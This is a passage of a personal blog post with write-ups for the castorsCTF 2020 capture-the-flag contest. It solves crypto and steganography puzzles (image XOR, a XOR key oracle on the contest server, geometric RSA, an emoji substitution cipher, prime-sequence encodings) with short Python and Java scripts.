---
author: george_pick
layout: post
title: "Castors CTF 2020"
excerpt: "Writeups for various challenges I solved during the 2020 castorsCTF capture the flag competition."
categories: [Capture The Flag]
---

> Welcome to the first castorsCTF!  
> This is a capture the flag competition, jeopardy style.  
> The event starts at 2000 UTC on Friday 29th May 2020 and runs until 2000 UTC on Sunday 31st May 2020. The flag format is `castorsCTF{[a-zA-Z0-9_.-]*}` unless otherwise specified.  
> The goal of our CTF is to promote learning amongst students, raise cybersecurity awareness, and have fun. To that end, we ask that you do not share solutions or hints until after the CTF is over. If a team is found sharing flags it will be grounds for immediate disqualification.

These are writeups to challenges I solved for this CTF. We as a team did pretty good this week again - top 10 finish! Thanks to Datajerk for kicking pwn ass as usual, Dobs for his reversing skills, and Redjohn for being my Jedi master and helping with the ways of the ~~force~~ web.

| [Crypto](#crypto) | [Misc](#misc) | [Reversing](#reversing) | [Web](#web) | [Forensics](#forensics) | [Coding](#coding) |
|--------|------|-----------|-----|-----------|--------|
| [Goose Chase](#goose-chase) | [GIF](#gif) | [XoR](#xor)| [Car Lottery](#car-lottery) | [Manipulation](#manipulation) | [Arithmetics](#arithmetics)|
| [One Trick Pony](#one-trick-pony) | [Password Crack 1](#password-crack-1) | | [Quiz](#quiz) | [Leftovers](#leftovers) | [Glitchity Glitch](#glitchity-glitch) |
| [Warmup](#warmup)| [Password Crack 2](#password-crack-2) | | [Mixed Feelings](#mixed-feelings) | | [Flag Gods](#flag-gods) |
| [Two Paths](#two-paths)| [Password Crack 3](#password-crack-3) | | | | [Base Runner](#base-runner) |
| [Jigglypuff's Song](#jigglypuffs-song)| [To Plant a Seed](#to-plant-a-seed) | | | | |
| [Amazon](#amazon)| | | | | |
| [0x101 Dalmations](#0x101-dalmations)| | | | | |
|---
| | | | | | |

# Solved

# Crypto
## Goose Chase
> There's no stopping this crazy goose.  
> **\<chall.png\>**  
> **\<goose_stole_the_key.png\>**

Opening the two files, we see:

&nbsp;
![]({{ site.baseurl }}/img/castorsCTF2020/goose_chall.png)
&nbsp;

and

&nbsp;
![]({{ site.baseurl }}/img/castorsCTF2020/goose_stole_the_key.png)
&nbsp;

Pretty obviously an XOR problem, where we need to XOR one image against the other to get the flag. Some code to XOR two pngs that are the same size:

{% highlight python %}
#!/usr/bin/env python3
import numpy as np
from PIL import Image, ImageChops

def main():
    # Open images
    im1 = Image.open("goose_stole_the_key.png")
    im2 = Image.open("goose_chall.png")

    assert(im1.size == im2.size)
    width, height = im1.size
    image3 = Image.new('RGB', (width, height))

    for row in range(0, height):
        for col in range(0, width):
            r1, g1, b1 = im1.getpixel((col, row))[:3]
            r2, g2, b2 = im2.getpixel((col, row))[:3]
            r3 = r1 ^ r2
            g3 = g1 ^ g2
            b3 = b1 ^ b2
            image3.putpixel((col, row), (r3, g3, b3))

    image3.save('result.png')
    image3.show()

if __name__ == '__main__':
    main()
{% endhighlight %}

Which gives us the flag:

&nbsp;
![]({{ site.baseurl }}/img/castorsCTF2020/goose_flag.png)
&nbsp;

Flag is `castorsCTF{m355_w1th_7h3_h0nk_y0u_g3t_7h3_b0nk}`.

&nbsp;
&nbsp;

## One Trick Pony
> nc chals20.cybercastors.com 14422

All we get for this one is a remote endpoint. Connecting to it, we see it is XOR'ing whatever we input it with a fixed key. We know this because if we happen to guess the correct letter at the correct index, it will return nothing as XOR is it's own self-inverse:

{% highlight bash %}
nc chals20.cybercastors.com 14422
>
b''
> A
b'"'
> B
b'!'
> c
b''
> cA
b' '
> castorsCTF{
b''
{% endhighlight %}

This is more or the less the same exact problem we've seen at various CTFs before ([Fireshell's Warmup Roxs](https://bigpick.github.io/TodayILearned/articles/2020-03/fireshell-ctf-writeups#warmup-rox), [AUCTF's extraordinary](https://github.com/bigpick/CaptureTheFlagCode/blob/master/auctf2020/extraordinary_pwn.py), etc...). Just send one char at a time and if what you get back is empty, tack it on to the flag so far and repeat:

{% highlight python %}
#!/usr/bin/env python
from pwn import *

ALPHABET="ABCDEFGHIJKLMNOPQRSTUVWXYZ#{}_-+[,.=!@$%&0123456789 "

# Initially, we know starts with F#{
key_so_far="castorsCTF{"

while 1<2:
    conn = remote('chals20.cybercastors.com', 14422)
    i = 0
    for _ in range(100):
        conn.sendline(key_so_far+ALPHABET[i])
        response = conn.recvline().split()[-1].decode("utf-8")
        size = len(key_so_far+ALPHABET[i])
        if response == ("b''"):
            # Found next char
            key_so_far+=ALPHABET[i]
            print(key_so_far)
            i=0
            continue
        # Try lower case
        if ALPHABET[i].isalpha():
            conn.sendline(key_so_far+(ALPHABET[i].lower()))
            response = conn.recvline().split()[-1].decode("utf-8")
            if response == ("b''"):
                # Found next char
                key_so_far+=ALPHABET[i].lower()
                print(key_so_far)
                i=0
        i+=1
{% endhighlight %}

Gives us the flag:

{% highlight bash %}
[+] Opening connection to chals20.cybercastors.com on port 14422: Done
castorsCTF{k
castorsCTF{k3
...
castorsCTF{k33p_y0ur_k3y5_53cr37_4nd_d0n7_r3u53_7h3m!}
{% endhighlight %}

Flag is `castorsCTF{k33p_y0ur_k3y5_53cr37_4nd_d0n7_r3u53_7h3m!}`.

&nbsp;
&nbsp;

## Warmup
> you know what to do  
> **\<warmup_chall.png\>**  
> **\<warmup_chall.txt\>**

The two attached files are:

&nbsp;
![]({{ site.baseurl }}/img/castorsCTF2020/warmup_chall.png)
&nbsp;

and

```
a=p+q
b=p-q
c^2=41027546415588921135190519817388916847442693284567375482282571314638757544938653824671437300971782426302443281077457253827782026089649732942648771306702020
A=1780602199528179468577178612383888301611753776788787799581979768613992169436352468580888042155360498830144442282937213247708372597613226926855391934953064
e=0x10001
enc=825531027337680366509171870396193970230179478931882005355846498785843598000659828635030935743236266080589740863128695174980645084614454653557872620514117
```

So it looks like a twist on RSA. Originally, I spent a few hours on this challenge and had _no_ idea what to do, as the numbers were _giant_. However, after awhile, they mentioned that instead of giving c<sup>2</sup> like in above, it was originally just labelled c! So, with that knowledge in mind, I made progress and was able to get the flag.

In order to get the RSA constraints, we need to do some math to get the values of the sides of the triangle (`a` and `b`). They gave us c<sup>2</sup>, which will be useful since the hypotenuse (c) of a triangle is **_a<sup>2</sup> + b<sup>2</sup> = c<sup>2</sup>_**.

They also gave us `A`, which from the photo and common sense, is the area of the triangle. The area of a triangle is defined as **_A=0.5*(a*b)_**.

With this information, and the given values, we have enough to find the remaining values of the triangle! I based all of my work almost entirely off of the [awesome explanation of this concept by Mufasa on StackOverflow](https://math.stackexchange.com/a/1263655).

At first, I tried doing the math out in Python, but it was complaining about integer overflow since the numbers were so large. Instead, I switched to Java and using the [BigInteger](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/math/BigInteger.html) class.

If you're interested in the ideas behind the math equations, that SO link really does a good job (and better than I could) of explaining the process. Here is what the Java code ended up looking like:

{% highlight java %}
import java.math.BigInteger;

public class Main {
    /*
     * Method to do sqrt on a BigInteger.
     * Credit: https://stackoverflow.com/a/16804098/13158274
     */
    public static BigInteger sqrt(BigInteger x) {
        BigInteger div = BigInteger.ZERO.setBit(x.bitLength()/2);
        BigInteger div2 = div;
        for(;;) {
            BigInteger y = div.add(x.divide(div)).shiftRight(1);
            if (y.equals(div) || y.equals(div2))
                return y;
            div2 = div;
            div = y;
        }
    }

    public static void main(String[] args) {
        java.math.BigInteger c_squared = new java.math.BigInteger("41027546415588921135190519817388916847442693284567375482282571314638757544938653824671437300971782426302443281077457253827782026089649732942648771306702020");
        java.math.BigInteger A = new java.math.BigInteger("1780602199528179468577178612383888301611753776788787799581979768613992169436352468580888042155360498830144442282937213247708372597613226926855391934953064");
        java.math.BigInteger e = new java.math.BigInteger("65537");
        java.math.BigInteger ct = new java.math.BigInteger("825531027337680366509171870396193970230179478931882005355846498785843598000659828635030935743236266080589740863128695174980645084614454653557872620514117");
        java.math.BigInteger sixteen = new java.math.BigInteger("16");

        // Calculate a, by using a^4−c^2*a^2+4*(A^2) = 0
        java.math.BigInteger  a = sqrt(c_squared.add( sqrt((c_squared.pow(2)).subtract(sixteen.multiply(A.pow(2))))).divide(new BigInteger("2")) );
        System.out.println("a = "+a);

        // Calculate b from a^2 + b^2 = c^2 (since we now know c and a)
        java.math.BigInteger b = sqrt(c_squared.subtract(a.pow(2)));
        System.out.println("b = "+b);

        // Calculate p, since:
        //   a = p + q            (1)
        //   b = p - q            (2)
        //  so
        //   q = a - p            (1 re-arranged, 3)
        //   b = p - (a - p)      (plugging 3 into 2 for q, 4)
        //     b = p - a + p
        //     b = 2p -a
        //     a+b = 2p
        //     (a+b)/2 = p
        java.math.BigInteger p = (b.add(a)).divide(new BigInteger("2"));
        System.out.println("p = "+p);
        // And then calculate q since we know a and p, and a=p+q so q=a-p
        java.math.BigInteger q = (a.subtract(p));
        System.out.println("q = "+q);

        // Sanity check, based on what they gave us in the chall.txt values:
        System.out.println(p.add(q).equals(a));
        System.out.println(p.subtract(q).equals(b));

        // Now just doing normal RSA stuff now that we have all values, first we find phi
        BigInteger phi = (p.subtract(new BigInteger("1"))).multiply(q.subtract(new BigInteger("1")));
        // Then we need to find the modulus (usually referred to as N)
        BigInteger modulus = p.multiply(q);
        // Then we can find the private key (d, usually)
        BigInteger privateKey = e.modInverse(phi);
        // Value dump
        System.out.println("modulus = "+modulus);
        System.out.println("phi = "+phi);
        System.out.println("d = "+privateKey);
        // Now we just find our plaintext since we got the private key:
        System.out.println("plaintext = "+ct.modPow(privateKey, modulus));
        // Convert the decimal number to hex, and then the hex to ascii
        //  --> castorsCTF{n0th1ng_l1k3_pr1m3_numb3r5_t0_w4rm_up_7h3_3ng1n3s}
    }
}
{% endhighlight %}

Compile with `javac Main.java`, and then run it with `java Main`. After converting the plaintext decimal number to hex, and then the hex to ascii (I just online RapidTables, for example), we get the flag.

Flag is `castorsCTF{n0th1ng_l1k3_pr1m3_numb3r5_t0_w4rm_up_7h3_3ng1n3s}`.

I really liked this take on a usually boring/routine RSA task. Kudos to the authors on this one, even though they did mess up originally.

&nbsp;
&nbsp;

## Two Paths
> The flag is somewhere in these woods, but which path should you take?  
> **\<two-paths.png\>**

All we get is the PNG on this one. Opening it up, we see it just looks like a typical image for Robert Frost's [The Road Not Taken](https://www.poetryfoundation.org/poems/44272/the-road-not-taken) poem:

&nbsp;
![]({{ site.baseurl }}/img/castorsCTF2020/two-paths.png)
&nbsp;

Doing some initial things with the file, we see it's a legit PNG, but there is some extra data at the end after the `IEND` chunk:

{% highlight bash %}
pngcheck -v two-paths.png
File: two-paths.png (850715 bytes)
  chunk IHDR at offset 0x0000c, length 13
    640 x 800 image, 32-bit RGB+alpha, non-interlaced
  chunk IDAT at offset 0x00025, length 8192
    zlib: deflated, 32K window, fast compression
  chunk IDAT at offset 0x02031, length 8192
  …
  chunk IDAT at offset 0xce4f9, length 5447
  chunk IEND at offset 0xcfa4c, length 0
  additional data after IEND chunk
ERRORS DETECTED in two-paths.png
{% endhighlight %}

Taking a look at the end of the file, we see some suspicious extra binary!:

```
cat two-paths.png
...
                                                                                   e�<��T�+�"�����R5/i��zK��-u�s|�=��Wtq2������`D��������Q��K/'����ݠ��kIEND�B`�
01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01100111 01101111 00101110 01100001 01110111 01110011 00101111 00110010 01111010 01110101 01000011 01000110 01000011 01110000
```

Parsing this binary into text, we get a URL link: `https://go.aws/2zuCFCp`. Going to this page reveals a web page consisting of a giant emoji cipher text:

&nbsp;
![]({{ site.baseurl }}/img/castorsCTF2020/emoji-hell.png)
&nbsp;

Wow - that is hard to look at. I tried playing around with these values for a while, and nothing I tried seem to make any progress:
* Replacing the emoji with the first letter of it's name
* Replacing each emoji with the letter of it's occurence (i.e. first emoji -> all occurences of it replaced to A, next new emoji --> B, etc...)

After a long time and some Googling, I tried a better approach at the replacement strategy above, taking the substitution cipher approach. By doing a common approach to solving substitution ciphers (frequency analysis) we can replace each emoji with what we think would be it's letter.

For my letter frequency values, I just took them [straight from Wikipedia](https://en.wikipedia.org/wiki/Letter_frequency).

{% highlight python %}
# From Wikipedia:
character_frequencies = {
    'a': .08497, 'b': .01492, 'c': .02202, 'd': .04253,
    'e': .11162, 'f': .02228, 'g': .02015, 'h': .06094,
    'i': .07546, 'j': .00153, 'k': .01292, 'l': .04025,
    'm': .02406, 'n': .06749, 'o': .07507, 'p': .01929,
    'q': .00095, 'r': .07587, 's': .06327, 't': .09356,
    'u': .02758, 'v': .00978, 'w': .02560, 'x': .00150,
    'y': .01994, 'z': .00077
}
{% endhighlight %}

In order to convert the emojis to something I could track for occurences, I stripped all html tags from the webpage (paragraph tags and entity tags, i.e `&#`).

This leaves just the emoji's numerical code, which looks like `9800`, `9811`, `9810`, etc... Then I counted the number of occurences of each emoji value and tracked them in a dictionary.

After sorting the dictionary of emoji occurences and the frequency of letter occurences to both being most frequent to least frequent, I could then just do a 1:1 replacement of emoji to letter.

{% highlight python %}
# Do the replacing
i = 0
for k, v in sorted_code_frequencies.items():
    print(f"Replacing {k} (occurences: {v}) with {most_frequent_letters[i]}")
    emoji_text = emoji_text.replace(k, most_frequent_letters[i])
    i +=1
{% endhighlight %}

Printing out the result gave us some text that was still pretty jumbled:

```
fergomtubmtxerl!_xn_ceu_fmr_oamk_tixl,_tiar_ceu_imqa_lebqak_tia_fxdiao!_va_sult_ieda_ceu_neurk_m_zeoa_annxfxart_vmc_neo_kafxdiaoxrg_timr_gexrg_era_pc_era_eo_abla_ceu_ver't_gat_tioeugi_tia_raht_dmot_qaoc_juxfybc._zmcpa_toc_paxrg_m_bxttba_zeoa_bmwc!


fnr_yxhdwpr_ghpoeyiihi_zul{kuxiufq_uiyy}lksine_yu{huirdrz}k_wordrrac_nd_fyrhooa{ewb_ftgtoirf}hl_{enmnksdegt_ecdbnfeh}wp_cie{tinhjhn_ja}hdweapuq_frclht_twbv_wkr{qgkasve_sb_hasltzjm_uq}spenqafu_zyh{odpnjlf_n}vxo1286r175nssr_tn{sslgfs}it_igjolkmdwy_ll{eddecjmg_re}porwwmtu_rhcbkyb{ddb_j}nihwczfnm_lk{ddasagiv_zpsifiw_ra_odmvccrowu_dh}osysnncq_xmbhcoh{qya_luxo_vaytue_tn{sslgfs}it_igjolkmdwy_ll{eddecj_mg_re}porwwmtu_rhcbkyb{ddb_cie{tinie{tinhjhn_ja}hdweapuq_frclht_twbv_wkr{qgkasve_sb_hasltzjm_uq}spenqafu_zyh{odpnjlf_n}vxo1286r175nssr_tn{sslgfs}it_igjolkmdwy_ll{eddecjmg_re}porwwmtuhjhn_ja}hdweapuq_frclhttwbv_wkr{q_gkasve_sbhasltzjm_uq}spenqafu_zy_h{odpnjlf_n}vxo1286r175n_luxo_vaytue_tn{sslgfs}it_igjolkmdwy_ll{eddecj_mg_re}porwghpoeyiihi_zul{kuxiufq_uiyy}lksine_yu{huirdrz}k_wordrrac_nd_fyrhooa{ewb_ftgtoirf}hl_{enmnksdegtwmtu_rhcbkyb{ddb_cie{tinhjhn_ja}hdweapuq_frclhttwb1286r175sr_tn{sslgfs}it_igjolkmdwy_zpsifiwh_ra_odmvccrowu_dh}osysnncq_xmbh_coh{qya_luxovaytue_pbq{mfpvtig_kmpaewcave_perqhbmexi_gm}uamczrgj_b{prsrafrnr_a}h_pcytgact_peslzshnmz_glzq{prtwvn_qpamjtlpvp_gudpetyqp}o_fmlteolftn{lmrfefie_nbmg_jswzbdg}_dn{tvjbxojo_eypowwtvoa_zwzbgdzjyh_vkyuzarpdy_qf}untaajtw_rtl{wylsxtk_xtkvkw_u}u_fyi{cjitch_hfmrpoahnr_w}wywwsyyng_xvedx{veaof_kbmz}iknv_iv
```

The first paragraph looks almost like text, but still not quite. Obviously the `_` represent spaces, and we can see some other punctuations (`!`, `,`, etc). Trying some standard crypto ciphers, ROT13, various ROTs, etc didn't work. Trying [quipquip](https://quipqiup.com/), however, yielded beautiful fruit:

```
congratulations!_ if_ you_ can_ read_ this,_ then_ you_ have_ solved_ the_ cipher!_ we_ just_ hope_ you_ found_ a_ more_ efficient_ way_ for_ deciphering_ than_ going_ one_ by_ one_ or_ else_ you_ won't_ get_ through_ the_ next_ part_ very_ quickly._ may be_ try_ being_ a_ little_ more_ lazy!
```

By looking at the input and the quipquip output, I just manually copied each replacement into Python. Then, running the replacement on the whole decoded emoji text, we get the same quipquip response for the first paragraph, but now the second paragraph also is decoded!


```
congratulations!_if_you_can_read_this,_then_you_have_solved_the_cipher!_we_just_hope_you_found_a_more_efficient_way_for_deciphering_than_going_one_by_one_or_else_you_won't_get_through_the_next_part_very_quickly._maybe_try_being_a_little_more_lazy!


cfn_kixpzbn_gxbrokhhxh_mus{duihucv_uhkk}sdjhfo_ku{xuhnpnm}d_zrnpnney_fp_cknxrre{ozl_ctgtrhnc}xs_{ofafdjpogt_oyplfcox}zb_yho{thfxqxf_qe}xpzoebuv_cnysxt_tzlw_zdn{vgdejwo_jl_xejstmqa_uv}jbofvecu_mkx{rpbfqsc_f}wir1286n175fjjn_tf{jjsgcj}ht_hgqrsdapzk_ss{oppoyqag_no}brnzzatu_nxyldkl{ppl_q}fhxzymcfa_sd{ppejeghw_mbjhchz_ne_rpawyynrzu_px}rjkjffyv_ialxyrx{vke_suir_wektuo_tf{jjsgcj}ht_hgqrsdapzk_ss{oppoyq_ag_no}brnzzatu_nxyldkl{ppl_yho{thfho{thfxqxf_qe}xpzoebuv_cnysxt_tzlw_zdn{vgdejwo_jl_xejstmqa_uv}jbofvecu_mkx{rpbfqsc_f}wir1286n175fjjn_tf{jjsgcj}ht_hgqrsdapzk_ss{oppoyqag_no}brnzzatuxqxf_qe}xpzoebuv_cnysxttzlw_zdn{v_gdejwo_jlxejstmqa_uv}jbofvecu_mk_x{rpbfqsc_f}wir1286n175f_suir_wektuo_tf{jjsgcj}ht_hgqrsdapzk_ss{oppoyq_ag_no}brnzgxbrokhhxh_mus{duihucv_uhkk}sdjhfo_ku{xuhnpnm}d_zrnpnney_fp_cknxrre{ozl_ctgtrhnc}xs_{ofafdjpogtzatu_nxyldkl{ppl_yho{thfxqxf_qe}xpzoebuv_cnysxttzl1286n175jn_tf{jjsgcj}ht_hgqrsdapzk_mbjhchzx_ne_rpawyynrzu_px}rjkjffyv_ialx_yrx{vke_suirwektuo_blv{acbwthg_dabeozyewo_bonvxlaoih_ga}ueaymngq_l{bnjnecnfn_e}x_byktgeyt_bojsmjxfam_gsmv{bntzwf_vbeaqtsbwb_gupbotkvb}r_castorsctf{sancocho_flag_qjzmlpg}_pf{twqlirqr_okbrzztwre_mzmlgpmqkx_wdkumenbpk_vc}ufteeqtz_nts{zksjitd_itdwdz_u}u_ckh{yqhtyx_xcanbrexfn_z}zkzzjkkfg_iwopi{woerc_dlam}hdfw_hw
```

If you look closely, you'll notice the second paragraph is actually _not_ jumbled, as towards the end, we see our flag (`castorsctf{sancocho_flag_qjzmlpg}`).

Full code:

{% highlight python %}
#!/usr/bin/env python3
import re

# From Wikipedia:
character_frequencies = {
    'a': .08497, 'b': .01492, 'c': .02202, 'd': .04253,
    'e': .11162, 'f': .02228, 'g': .02015, 'h': .06094,
    'i': .07546, 'j': .00153, 'k': .01292, 'l': .04025,
    'm': .02406, 'n': .06749, 'o': .07507, 'p': .01929,
    'q': .00095, 'r': .07587, 's': .06327, 't': .09356,
    'u': .02758, 'v': .00978, 'w': .02560, 'x': .00150,
    'y': .01994, 'z': .00077
}
# Load Cipher text
with open('decode_this.txt', 'r') as infile:
    emoji_text = infile.read()
# Strip HTML stuff, already had removed the <p> tags
emoji_codes = [x.strip() for x in emoji_text.split('&#') if x != ""]
code_frequencies = {}
emoji_text = emoji_text.replace("&", "").replace("#", "")
# We don't care about the _ { }, only want the emoji codes
for x in emoji_codes:
    code = re.sub("[^0-9]", "", x)
    try:
        code_frequencies[code] += 1
    except KeyError:
        code_frequencies[code] = 1
# Now Sort the emoji code, most frequent first
sorted_code_frequencies = {k: v for k, v in sorted(code_frequencies.items(), key=lambda item: item[1], reverse=True)}
# Also sort the letter frequencies, most frequent first
sorted_letter_frequencies = {k: v for k, v in sorted(character_frequencies.items(), key=lambda item: item[1], reverse=True)}
# Make the sorted letter keys to a list for easier indexing
most_frequent_letters = list(sorted_letter_frequencies)
# We need to be able to replace a-z
assert len(sorted_code_frequencies) == 26

# Do the replacing
i = 0
for k, v in sorted_code_frequencies.items():
    print(f"Replacing {k} (occurences: {v}) with {most_frequent_letters[i]}")
    emoji_text = emoji_text.replace(k, most_frequent_letters[i])
    i +=1

# Scrambled text
print(emoji_text)

# From quipqup, just manually copied the results
emoji_text = emoji_text.upper()
emoji_text = emoji_text.replace("A", "e")
emoji_text = emoji_text.replace("B", "l")
emoji_text = emoji_text.replace("C", "y")
emoji_text = emoji_text.replace("D", "p")
emoji_text = emoji_text.replace("E", "o")
emoji_text = emoji_text.replace("F", "c")
emoji_text = emoji_text.replace("G", "g")
emoji_text = emoji_text.replace("H", "x")
emoji_text = emoji_text.replace("I", "h")
emoji_text = emoji_text.replace("J", "q")
emoji_text = emoji_text.replace("K", "d")
emoji_text = emoji_text.replace("L", "s")
emoji_text = emoji_text.replace("M", "a")
emoji_text = emoji_text.replace("N", "f")
emoji_text = emoji_text.replace("O", "r")
emoji_text = emoji_text.replace("P", "b")
emoji_text = emoji_text.replace("Q", "v")
emoji_text = emoji_text.replace("R", "n")
emoji_text = emoji_text.replace("S", "j")
emoji_text = emoji_text.replace("T", "t")
emoji_text = emoji_text.replace("U", "u")
emoji_text = emoji_text.replace("V", "w")
emoji_text = emoji_text.replace("W", "z")
emoji_text = emoji_text.replace("X", "i")
emoji_text = emoji_text.replace("Y", "k")
emoji_text = emoji_text.replace("Z", "m")

# Look for castorsctf{ in the bottom output
print(emoji_text)
{% endhighlight %}

Flag is `castorsCTF{sancocho_flag_qjzmlpg}`

&nbsp;
&nbsp;

## Jigglypuff's Song
> Can you hear Jigglypuff's song?  
> **\<jigglypuff_chall.png\>**

Again, all we get is a PNG:

&nbsp;
![]({{ site.baseurl }}/img/castorsCTF2020/jigglypuff_chall.png)
&nbsp;

That looks pretty weird. Toying around with it in Stegsolve, we see some text when inspecting the R,G, and B channel's 7th bit, MSB first:

```
fffff81fffffffff ffffffffffffffff  ........ ........
fffffff008000000 0000000000000000  ........ ........
0000000000000000 0000000000000000  ........ ........
0000000000000000 0000000000000000  ........ ........
000000000061206c 696520616e642068  .....a l ie and h
75727420796f750a 636173746f727343  urt you. castorsC
54467b7231636b5f 72306c6c5f77316c  TF{r1ck_ r0ll_w1l
6c5f6e337633725f 6433733372745f79  l_n3v3r_ d3s3rt_y
30757575757d5765 277265206e6f2073  0uuuu}We 're no s
7472616e67657273 20746f206c6f7665  trangers  to love
0a596f75206b6e6f 7720746865207275  .You kno w the ru
6c657320616e6420 736f20646f20490a  les and  so do I.
412066756c6c2063 6f6d6d69746d656e  A full c ommitmen
7427732077686174 2049276d20746869  t's what  I'm thi
6e6b696e67206f66 0a596f7520776f75  nking of .You wou
6c646e2774206765 7420746869732066  ldn't ge t this f
726f6d20616e7920 6f74686572206775  rom any  other gu
790a49206a757374 2077616e6e612074  y.I just  wanna t
656c6c20796f0000 0000000000000000  ell yo.. ........
```

Flag is `castorsCTF{r1ck_r0ll_w1ll_n3v3r_d3s3rt_y0uuuu}`.

&nbsp;
&nbsp;

## Amazon
> Are you watching the new series on Amazon?
>
> 198 291 575 812 1221 1482 1955 1273 1932 2030 3813 2886 1968 4085 3243 5830 5900 5795 5628 3408 7300 4108 10043 8455 6790 4848 11742 10165 8284 5424 14986 6681 13015 10147 7897 14345 13816 8313 18370 8304 19690 22625

This one I stared at for a _long_ time before it clicked. At first, I tried looking around at things on Amazon. Product IDs, page numbers, etc. But it was way too vague and could literally be anything. Then I thought maybe Amazon Prime, but you'd need an account for that, and they wouldn't make anyone have to signup for an account for a challenge. The author kept hinting at _where do you watch movies on Amazon_, which I thought, _Yeah, duh, Amazon Prime, but I already thought about that_.

Then after a while, the author mentioned there was still another hint in the description... After another long pondering, I focused on

> Are you watching the new **_series_** on Amazon?

Combining series with all the previous hints about Amazon Prime, you get, magic: prime sequence. With this in mind, we set off to try to find how the given numbers related to a prime sequence.

Looking up the list of primes on Google we get:

{% highlight python %}
primes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199]
{% endhighlight %}

We toyed around with this for a while by hand, until realizing that if you take the prime number at index _i_ and divide the given value at the same index _i_, you get a decimal number. Since we know the flag format is `castorsCTF{...}`, when we realized the first value was 99 (which is `c` in ASCII), and the second was 97 (`a` in ASCII), it was pretty clear.

{% highlight python %}
#!/usr/bin/env python
numbers = "198 291 575 812 1221 1482 1955 1273 1932 2030 3813 2886 1968 4085 3243 5830 5900 5795 5628 3408 7300 4108 10043 8455 6790 4848 11742 10165 8284 5424 14986 6681 13015 10147 7897 14345 13816 8313 18370 8304 19690 22625".split()
primes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199]
for i, x in enumerate(numbers):
    print(chr(int(int(x)/primes[i])), end='')
{% endhighlight %}

The flag is `castorsCTF{N0_End_T0d4y_F0r_L0v3_I5_X3n0n}`.

&nbsp;
&nbsp;

## 0x101 Dalmations
> Response to Amazon: Nah, I only need to be able to watch 101 Dalmatians.
>
> c6 22 3d 29 c1 c5 9c f5 85 e7 d7 0e 46 e6 21 e7 dd 8d db 43 a0 34 77 04 7f 32 13 8c c9 01 65 78 5f c0 14 8e 33 bf bc 02 21 79 e1 5d d3 46 e0 ca ee 72 c2 26 38

A follow up to the Amazon challenge, we can assume this is another series/sequence type problem. Some hints in discord mentioned that the `0x101` value is really important.

We first tried something like:

{% highlight python %}
>>> (0xc6 ^ 0*0x101 ) / 2
99.0
>>> (0x22 ^ 1*0x101 ) / 3
97.0
>>> (0x3d ^ 2*0x101 ) / 5
{% endhighlight %}

Which was the `(given_value[index] ^ index*0x101) / prime[index]` as a more direct extension of the first problem. This worked for the first four letters (`cast`), but then fell apart into nonsense. A while longer, and talking with the author, the mentioned that it really doesn't involve XOR'ing or dividing at all. So back to the drawing board again.

After a while longer, we came with something that worked for the first few chars again:

{% highlight python %}
>>> 99 * 2 % 0x101
198
>>> 97 * 3 % 0x101
34
>>> 115 * 5 % 0x101
61
{% endhighlight %}

This was since we _knew_ that those initial plaintext values where `c`, `a`, `s`, etc. But after that, we'd need to brute force all possible values until whatever plaintext value we gave it ` … * prime[index] % 0x101 == given_value[index]`. That ended up looking like so:

{% highlight python %}
#!/usr/bin/env python
numbers = "c6 22 3d 29 c1 c5 9c f5 85 e7 d7 0e 46 e6 21 e7 dd 8d db 43 a0 34 77 04 7f 32 13 8c c9 01 65 78 5f c0 14 8e 33 bf bc 02 21 79 e1 5d d3 46 e0 ca ee 72 c2 26 38".split()

primes = ['2', '3', '5', '7', '11', '13', '17', '19', '23', '29', '31', '37', '41', '43', '47', '53', '59', '61', '67', '71', '73', '79', '83', '89', '97', '101', '103', '107', '109', '113', '127', '131', '137', '139', '149', '151', '157', '163', '167', '173', '179', '181', '191', '193', '197', '199', '211', '223', '227', '229', '233', '239', '241', '251', '257', '263', '269', '271', '277', '281', '283', '293', '307', '311', '313', '317', '331', '337', '347', '349', '353', '359', '367', '373', '379', '383', '389', '397', '401', '409', '419', '421', '431', '433', '439', '443', '449', '457', '461', '463', '467', '479', '487', '491', '499', '503', '509', '521', '523', '541']

for i, x in enumerate(numbers):
    pt = 0
    modulus = 0x101
    ct = int(x,16)
    while pt * int(primes[i]) % modulus != ct:
        pt+=1
    print(chr(pt), end='')
print()
{% endhighlight %}

Flag is `castorsCTF{1f_y0u_g07_th1s_w1th0u7_4ny_h1n7s_r3sp3c7}`.

&nbsp;
&nbsp;

# MISC
## GIF
> A1l3N thought this was funny so we turned it into a challenge.
> **\<gif_chall.gif\>**

Looking at the GIF:

&nbsp;
![]({{ site.baseurl }}/img/castorsCTF2020/gif/gif_chall.gif)
&nbsp;

Pretty obvious that we need to extract the numbers off the frames and those will translate to our letters of the flag.

Using `convert gif_chall.gif gif_chall.png` will convert each frame in the GIF to it's own individual image, of the formt `gif_chall-X.png` where X starts at 0.

Inspecting each image, we get:

&nbsp;
![]({{ site.baseurl }}/img/castorsCTF2020/gif/gif_chall-0.png)
&nbsp;
![]({{ site.baseurl }}/img/castorsCTF2020/gif/gif_chall-1.png)
&nbsp;
![]({{ site.baseurl }}/img/castorsCTF2020/gif/gif_chall-2.png)
&nbsp;
![]({{ site.baseurl }}/img/castorsCTF2020/gif/gif_chall-3.png)
&nbsp;
![]({{ site.baseurl }}/img/castorsCTF2020/gif/gif_chall-4.png)
&nbsp;
![]({{ site.baseurl }}/img/castorsCTF2020/gif/gif_chall-5.png)
&nbsp;
![]({{ site.baseurl }}/img/castorsCTF2020/gif/gif_chall-6.png)
&nbsp;
![]({{ site.baseurl }}/img/castorsCTF2020/gif/gif_chall-7.png)
&nbsp;
![]({{ site.baseurl }}/img/castorsCTF2020/gif/gif_chall-8.png)
&nbsp;
![]({{ site.baseurl }}/img/castorsCTF2020/gif/gif_chall-9.png)
&nbsp;
![]({{ site.baseurl }}/img/castorsCTF2020/gif/gif_chall-10.png)
&nbsp;
![]({{ site.baseurl }}/img/castorsCTF2020/gif/gif_chall-11.png)
&nbsp;
![]({{ site.baseurl }}/img/castorsCTF2020/gif/gif_chall-12.png)
&nbsp;
![]({{ site.baseurl }}/img/castorsCTF2020/gif/gif_chall-13.png)
